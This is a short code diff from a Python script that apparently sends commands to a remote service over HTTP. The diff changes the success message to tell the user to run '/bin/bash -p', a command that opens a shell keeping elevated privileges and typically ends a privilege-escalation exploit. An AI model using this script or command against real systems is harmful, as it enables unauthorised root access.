@@ -14,7 +14,7 @@ def exec_command(cmd):
     }
     response = requests.post(url=URL, json=payload, headers=HEADERS)
     if response.status_code == 200:
-        print("Command executed successfully.")
+        print("Command executed successfully. Execute '/bin/bash -p'")
     else:
         print(f"Failed to execute command. Status code: {response.status_code}")
 
